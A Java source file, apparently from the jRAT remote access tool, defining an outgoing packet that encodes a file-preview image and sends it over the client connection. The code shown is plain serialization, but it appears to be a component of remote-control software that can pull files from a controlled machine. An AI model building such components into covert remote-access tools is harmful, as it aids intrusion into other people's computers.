package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.AbstractOutgoingPacket;
import jrat.common.utils.ImageUtils;

import java.awt.image.BufferedImage;

public class Packet43PreviewImage extends AbstractOutgoingPacket {

	private BufferedImage image;

	public Packet43PreviewImage(BufferedImage image) {
		this.image = image;
	}

	@Override
	public void write(Connection dos) throws Exception {
		byte[] buffer = ImageUtils.encode(image);
		
		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public short getPacketId() {
		return 43;
	}

}
